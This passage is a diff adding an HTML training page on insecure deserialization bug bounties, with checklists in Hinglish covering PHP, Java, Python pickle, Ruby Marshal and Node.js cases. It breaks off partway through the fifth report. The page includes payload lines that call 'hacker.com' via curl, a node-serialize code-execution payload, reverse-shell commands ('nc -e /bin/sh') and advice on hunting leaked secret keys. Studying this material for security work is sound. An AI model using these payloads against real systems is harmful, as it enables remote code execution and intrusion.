@@ -1,0 +1,2512 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mission 11 — Insecure Deserialization Mastery</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&family=Inter:wght@300;400;500;600;700&display=swap');
+
+        :root {
+            --bg-deep: #080c12;
+            --bg-card: #0d1520;
+            --bg-card2: #111b2a;
+            --bg-box: #0a1219;
+            --border: #1a2d40;
+            --border-glow: #e74c3c33;
+            --cyan: #00c8ff;
+            --blue: #4488ff;
+            --purple: #9b59ff;
+            --green: #00ff88;
+            --yellow: #ffd700;
+            --orange: #ff8c42;
+            --red: #ff4757;
+            --accent: #e74c3c;
+            --accent2: #c0392b;
+            --text-primary: #e8f4f8;
+            --text-secondary: #7ba8c0;
+            --text-dim: #4a7090;
+            --severity-crit: #ff2d55;
+            --severity-high: #ff6b35;
+            --severity-med: #ffd700
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            background: var(--bg-deep);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background-image: radial-gradient(ellipse at 20% 0%, #e74c3c08 0%, transparent 50%), radial-gradient(ellipse at 80% 100%, #9b59ff06 0%, transparent 50%)
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, #e74c3c03 2px, #e74c3c03 4px);
+            pointer-events: none;
+            z-index: 0
+        }
+
+        .mission-header {
+            text-align: center;
+            padding: 60px 20px 40px;
+            position: relative
+        }
+
+        .mission-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #e74c3c22, #c0392b22);
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            letter-spacing: 4px;
+            padding: 6px 20px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            text-transform: uppercase
+        }
+
+        .mission-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(24px, 4.5vw, 48px);
+            font-weight: 900;
+            background: linear-gradient(135deg, #e74c3c, #c0392b, #9b59ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.1;
+            margin-bottom: 8px
+        }
+
+        .mission-subtitle {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--text-secondary);
+            letter-spacing: 2px
+        }
+
+        .mission-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 30px;
+            flex-wrap: wrap
+        }
+
+        .stat-item {
+            text-align: center
+        }
+
+        .stat-num {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--accent)
+        }
+
+        .stat-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            text-transform: uppercase
+        }
+
+        .master-progress {
+            max-width: 900px;
+            margin: 0 auto 50px;
+            padding: 0 20px
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px
+        }
+
+        .progress-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--accent);
+            letter-spacing: 2px
+        }
+
+        .progress-pct {
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            color: var(--accent)
+        }
+
+        .progress-bar-wrap {
+            height: 6px;
+            background: #1a2d40;
+            border-radius: 3px;
+            overflow: hidden
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), #9b59ff);
+            border-radius: 3px;
+            transition: width .5s ease;
+            box-shadow: 0 0 12px #e74c3c55;
+            width: 0%
+        }
+
+        .phase-section {
+            max-width: 1100px;
+            margin: 0 auto 60px;
+            padding: 0 20px
+        }
+
+        .phase-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .phase-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--accent);
+            background: #e74c3c14;
+            border: 1px solid #e74c3c33;
+            padding: 4px 10px;
+            border-radius: 2px;
+            letter-spacing: 2px
+        }
+
+        .phase-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary)
+        }
+
+        .phase-count {
+            margin-left: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim)
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(480px, 1fr));
+            gap: 24px
+        }
+
+        .report-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: all .3s ease;
+            position: relative;
+            animation: fadeInUp .4s ease both
+        }
+
+        .report-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent), #9b59ff);
+            opacity: 0;
+            transition: opacity .3s ease
+        }
+
+        .report-card:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 8px 40px #e74c3c12, 0 0 0 1px #e74c3c22;
+            transform: translateY(-2px)
+        }
+
+        .report-card:hover::before {
+            opacity: 1
+        }
+
+        .card-header {
+            padding: 18px 20px 14px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 12px;
+            border-bottom: 1px solid var(--border);
+            background: var(--bg-card2)
+        }
+
+        .card-meta {
+            flex: 1
+        }
+
+        .report-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            margin-bottom: 4px
+        }
+
+        .report-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            line-height: 1.3
+        }
+
+        .report-target {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #e07070;
+            margin-top: 4px
+        }
+
+        .severity-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 4px 10px;
+            border-radius: 3px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            flex-shrink: 0
+        }
+
+        .sev-critical {
+            background: #ff2d5520;
+            border: 1px solid #ff2d5560;
+            color: var(--severity-crit)
+        }
+
+        .sev-high {
+            background: #ff6b3520;
+            border: 1px solid #ff6b3560;
+            color: var(--severity-high)
+        }
+
+        .sev-medium {
+            background: #ffd70020;
+            border: 1px solid #ffd70060;
+            color: var(--severity-med)
+        }
+
+        .technique-tag {
+            display: inline-block;
+            background: #e74c3c14;
+            border: 1px solid #e74c3c44;
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 2px;
+            letter-spacing: 1px;
+            margin: 4px 4px 0 0
+        }
+
+        .card-body {
+            padding: 16px 20px
+        }
+
+        .scenario-box {
+            background: var(--bg-box);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 4px;
+            padding: 12px 14px;
+            margin-bottom: 16px
+        }
+
+        .scenario-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--accent);
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+            text-transform: uppercase
+        }
+
+        .scenario-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5
+        }
+
+        .checklist-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--blue);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .checklist-label::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border)
+        }
+
+        .checklist {
+            list-style: none
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 7px 0;
+            border-bottom: 1px solid #1a2d4060;
+            cursor: pointer;
+            transition: all .2s ease;
+            border-radius: 3px
+        }
+
+        .checklist-item:last-child {
+            border-bottom: none
+        }
+
+        .checklist-item:hover {
+            background: #e74c3c06;
+            padding-left: 6px
+        }
+
+        .item-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 1.5px solid var(--accent);
+            border-radius: 3px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+            transition: all .2s ease;
+            background: transparent
+        }
+
+        .checklist-item.done .item-checkbox {
+            background: var(--green);
+            border-color: var(--green)
+        }
+
+        .checklist-item.done .item-checkbox::after {
+            content: '✓';
+            color: #080c12;
+            font-size: 11px;
+            font-weight: 700
+        }
+
+        .item-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            flex-shrink: 0;
+            padding-top: 1px
+        }
+
+        .item-text {
+            font-size: 12.5px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            flex: 1;
+            transition: color .2s
+        }
+
+        .checklist-item.done .item-text {
+            color: var(--text-dim);
+            text-decoration: line-through;
+            text-decoration-color: #4a709066
+        }
+
+        .card-progress {
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border)
+        }
+
+        .card-progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px
+        }
+
+        .card-progress-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--text-dim);
+            letter-spacing: 1px
+        }
+
+        .card-progress-pct {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--green)
+        }
+
+        .card-bar-wrap {
+            height: 3px;
+            background: #1a2d40;
+            border-radius: 2px;
+            overflow: hidden
+        }
+
+        .card-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--green));
+            border-radius: 2px;
+            transition: width .4s ease;
+            width: 0%
+        }
+
+        .mindset-box {
+            background: #9b59ff0a;
+            border: 1px solid #9b59ff33;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 14px
+        }
+
+        .mindset-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--purple);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .mindset-text {
+            font-size: 12px;
+            color: #b89ddd;
+            line-height: 1.5;
+            font-style: italic
+        }
+
+        .protip-box {
+            background: #ffd70009;
+            border: 1px solid #ffd70033;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .protip-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--yellow);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .protip-text {
+            font-size: 12px;
+            color: #c9a83a;
+            line-height: 1.5
+        }
+
+        .chain-box {
+            background: #e74c3c09;
+            border: 1px solid #e74c3c30;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .chain-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--accent);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .chain-formula {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #d44;
+            line-height: 1.6
+        }
+
+        .impact-box {
+            background: #ff2d5509;
+            border: 1px solid #ff2d5530;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .impact-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--red);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .impact-text {
+            font-size: 12px;
+            color: #d44466;
+            line-height: 1.5
+        }
+
+        .filter-bar {
+            max-width: 1100px;
+            margin: 0 auto 30px;
+            padding: 0 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            align-items: center
+        }
+
+        .filter-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 1px
+        }
+
+        .filter-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            padding: 5px 14px;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all .2s ease;
+            letter-spacing: 1px
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: #e74c3c10
+        }
+
+        .mission-footer {
+            text-align: center;
+            padding: 40px 20px 60px;
+            border-top: 1px solid var(--border)
+        }
+
+        .footer-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim);
+            letter-spacing: 2px
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-deep)
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #1a2d40;
+            border-radius: 3px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent)
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .report-card:nth-child(2n) {
+            animation-delay: .05s
+        }
+
+        .report-card:nth-child(3n) {
+            animation-delay: .10s
+        }
+
+        code.c {
+            color: #e07070;
+            font-size: 11px;
+            background: #e74c3c11;
+            padding: 1px 5px;
+            border-radius: 3px
+        }
+
+        @media(max-width:700px) {
+            .cards-grid {
+                grid-template-columns: 1fr
+            }
+
+            .mission-stats {
+                gap: 20px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="mission-header">
+        <div class="mission-badge">⬡ MISSION 11 ⬡ INSECURE DESERIALIZATION ⬡</div>
+        <h1 class="mission-title">INSECURE<br>DESERIALIZATION</h1>
+        <p class="mission-subtitle">// PHP · JAVA · PYTHON · RUBY · .NET · NODE.JS — 30 REAL BOUNTY REPORTS</p>
+        <div class="mission-stats">
+            <div class="stat-item">
+                <div class="stat-num" id="totalReports">30</div>
+                <div class="stat-label">Total Reports</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="completedItems">0</div>
+                <div class="stat-label">Steps Done</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num">140</div>
+                <div class="stat-label">Techniques Mapped</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="completedCards">0</div>
+                <div class="stat-label">Reports Completed</div>
+            </div>
+        </div>
+    </header>
+    <div class="master-progress">
+        <div class="progress-header"><span class="progress-label">◈ OVERALL MISSION PROGRESS</span><span
+                class="progress-pct" id="masterPct">0%</span></div>
+        <div class="progress-bar-wrap">
+            <div class="progress-bar-fill" id="masterBar"></div>
+        </div>
+    </div>
+    <div class="filter-bar">
+        <span class="filter-label">FILTER ▸</span>
+        <button class="filter-btn active" onclick="filterCards('all',this)">ALL (30)</button>
+        <button class="filter-btn" onclick="filterCards('critical',this)">🔴 CRITICAL</button>
+        <button class="filter-btn" onclick="filterCards('high',this)">🟠 HIGH</button>
+        <button class="filter-btn" onclick="filterCards('medium',this)">🟡 MEDIUM</button>
+        <button class="filter-btn" onclick="filterCards('complete',this)">✅ COMPLETE</button>
+        <button class="filter-btn" onclick="filterCards('incomplete',this)">⏳ IN PROGRESS</button>
+    </div>
+
+    <!-- ═══ PHASE 1 — LANGUAGE CORE ═══ -->
+    <section class="phase-section" id="phase1">
+        <div class="phase-header"><span class="phase-number">PHASE 01</span><span class="phase-title">LANGUAGE-SPECIFIC
+                DESERIALIZATION (CORE)</span><span class="phase-count" id="p1count">0 / 6 reports</span></div>
+        <div class="cards-grid" id="grid-phase1">
+
+            <!-- #01 PHP -->
+            <div class="report-card" data-severity="critical" id="report-01">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #01 · Total #290</div>
+                        <div class="report-title">PHP "Magic" Hack — Cookie Deserialization to RCE</div>
+                        <div class="report-target">🎯 E-commerce Site · HackerOne · $10,000+ · Root Access</div>
+                        <div style="margin-top:8px"><span class="technique-tag">PHP unserialize()</span><span
+                                class="technique-tag">__destruct()</span><span class="technique-tag">PHPGGC</span></div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Cookie value Base64 decode: <code
+                                class="c">O:4:"User":2:{s:8:"username";s:5:"avin";s:7:"isAdmin";b:0;}</code> — ye PHP
+                            serialized object hai. Code mein <code class="c">__destruct()</code> magic method tha jo
+                            Logger class se file delete karta tha. Hacker ne object manipulate karke Logger class
+                            banaya, filename mein <code class="c">shell.php</code> pass kiya → Server ne deserialize
+                            kiya → Shell saved → Root Access.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Magic Bytes identify karo</strong> — Data <code
+                                    class="c">O:数字:"ClassName"</code> se shuru ho raha hai? = PHP serialized
+                                object.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Source code mein unserialize() dhoondho</strong> — JS files,
+                                GitHub repos, aur config leaks mein search karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Magic Methods check karo</strong> — <code
+                                    class="c">__wakeup()</code>, <code class="c">__destruct()</code>, <code
+                                    class="c">__toString()</code> — ye entry points hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Privilege escalation test karo</strong> — <code
+                                    class="c">isAdmin</code> ya <code class="c">role</code> ki value badal kar dekho
+                                (<code class="c">b:0</code> → <code class="c">b:1</code>).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>PHPGGC se payload generate karo</strong> — <code
+                                    class="c">phpggc -l</code> se available chains dekho, best match use karo.</span>
+                        </li>
+                    </ul>
+                    <div class="chain-box">
+                        <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                        <div class="chain-formula">Decode Cookie (Base64) → Identify PHP Object → Find Magic Methods →
+                            Build Gadget Chain (PHPGGC) → Inject → RCE</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #02 Java -->
+            <div class="report-card" data-severity="critical" id="report-02">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #02 · Total #291</div>
+                        <div class="report-title">Java Deserialization — ysoserial RCE on Enterprise Cloud</div>
+                        <div class="report-target">🎯 ██████ (Cloud Provider) · HackerOne · $15,000 · 10.0 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">rO0AB / AC ED</span><span
+                                class="technique-tag">ysoserial</span><span
+                                class="technique-tag">CommonsCollections</span></div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Cookie: <code class="c">JSESSIONID=rO0ABXNy...</code>. <code
+                                class="c">rO0</code> = Java Magic Bytes (<code class="c">AC ED 00 05</code> Hex). Server
+                            purana Apache Commons Collections use kar raha tha. <code
+                                class="c">ysoserial CommonsCollections1 "curl hacker.com"</code> se payload generate →
+                            Cookie replace → <code class="c">readObject()</code> call → Full RCE!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>rO0AB scan karo</strong> — Burp Proxy mein <code
+                                    class="c">rO0AB</code> filter lagao. Ye Base64 Java serialization signature
+                                hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Content-Type check karo</strong> — <code
+                                    class="c">application/x-java-serialized-object</code> header = Java deser
+                                confirmed.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>ysoserial try karo</strong> — CommonsCollections, Groovy,
+                                Spring — alag-alag gadgets try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Blind OOB test karo</strong> — Response nahi mila? <code
+                                    class="c">ping</code> ya <code class="c">dnslog</code> se Out-of-Band check
+                                karo.</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                        <div class="mindset-text">"Java binary format readable nahi hota — SerializationDumper tool use
+                            karo. RCE ke liye pehle se maujood classes ko 'Chain' karna padta hai = Gadget Chain."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #03 Python Pickle -->
+            <div class="report-card" data-severity="critical" id="report-03">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #03 · Total #292</div>
+                        <div class="report-title">Python Pickle RCE — ML Model Upload Exploit</div>
+                        <div class="report-target">🎯 ██████ (AI/ML Platform) · HackerOne · $5,000 · 9.8 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">pickle.loads()</span><span
+                                class="technique-tag">__reduce__()</span><span class="technique-tag">.pkl Upload</span>
+                        </div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Platform ML models (<code class="c">.pkl</code>) upload karne deta
+                            tha. Python <code class="c">__reduce__()</code> magic method batata hai object kaise
+                            reconstruct karna hai. Hacker ne malicious class banayi: <code
+                                class="c">return (os.system, ('curl hacker.com',))</code> → Upload → Server ne
+                            "Unpickle" kiya → <code class="c">curl</code> execute → Full RCE!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Extensions scan karo</strong> — <code class="c">.pkl</code>,
+                                <code class="c">.pickle</code>, <code class="c">.p</code>, <code
+                                    class="c">.joblib</code> files = Python serialization.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Base64 strings check karo</strong> — Python objects cookies
+                                mein <code class="c">gASV...</code> se start hote hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>PyYAML bhi test karo</strong> — <code
+                                    class="c">yaml.load()</code> (bina SafeLoader) bhi same RCE deta hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>DNSLog se verify karo</strong> — Payload mein <code
+                                    class="c">nslookup</code> dalo taaki blind execution confirm ho.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #04 Ruby Marshal -->
+            <div class="report-card" data-severity="critical" id="report-04">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #04 · Total #293</div>
+                        <div class="report-title">Ruby Marshal RCE — Leaked Secret Key + Session Cookie</div>
+                        <div class="report-target">🎯 ██████ (DevOps/Git Platform) · HackerOne · $3,000 · 8.8 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">Marshal.load()</span><span
+                                class="technique-tag">secret_key_base</span><span class="technique-tag">ERB Eval</span>
+                        </div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Ruby Marshal data: <code class="c">\x04\x08</code> (Hex) = Base64
+                            mein <code class="c">BAh7</code>. GitHub par leaked <code class="c">secrets.yml</code> se
+                            <code class="c">secret_key_base</code> mili → Hacker ne malicious Marshal object sign kiya →
+                            <code class="c">ActiveSupport::Deprecation</code> gadget se ERB eval → <code
+                                class="c">whoami</code> execute → RCE!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>\x04\x08 scan karo</strong> — Cookies/hidden fields <code
+                                    class="c">BAh</code> (Base64) se start ho rahe hain?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Secrets dhoondho</strong> — GitHub, <code
+                                    class="c">.env</code> files mein <code class="c">secret_key_base</code> search
+                                karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>YAML.load bhi test karo</strong> — Ruby mein <code
+                                    class="c">YAML.load</code> equally dangerous hai purane versions mein.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Universal gadgets try karo</strong> — <code
+                                    class="c">Gem::SpecFetcher</code> jo zyadatar apps mein hota hai.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #05 Node.js -->
+            <div class="report-card" data-severity="critical" id="report-05">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #05 · Total #294</div>
+                        <div class="report-title">Node.js node-serialize IIFE RCE</div>
+                        <div class="report-target">🎯 ██████ (Analytics Dashboard) · HackerOne · $2,500 · 9.3 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">$$ND_FUNC$$</span><span
+                                class="technique-tag">IIFE Trick</span><span class="technique-tag">child_process</span>
+                        </div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Profile cookie Base64 JSON: <code
+                                class="c">{"username":"avin"}</code>. App <code class="c">node-serialize</code> use kar
+                            rahi thi jo functions bhi serialize karta hai. Payload: <code
+                                class="c">{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /')}()"}</code>
+                            — IIFE <code class="c">()</code> se turant execute → File list leak → Bounty!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>$$ND_FUNC$$ identify karo</strong> — Serialized data mein ye
+                                string dikhe = node-serialize confirmed.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>IIFE () mat bhoolna</strong> — Function end mein <code
+                                    class="c">()</code> lagana zaroori hai, warna execute nahi hoga.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>serialize-js bhi check karo</strong> — Similar behaviour dikha
+                                sakti hai agar insecurely use ho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Reverse shell test karo</strong> — <code
+                                    class="c">nc -e /bin/sh</code> ya <code class="c">bash -i</code> se connection check
+                                karo.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
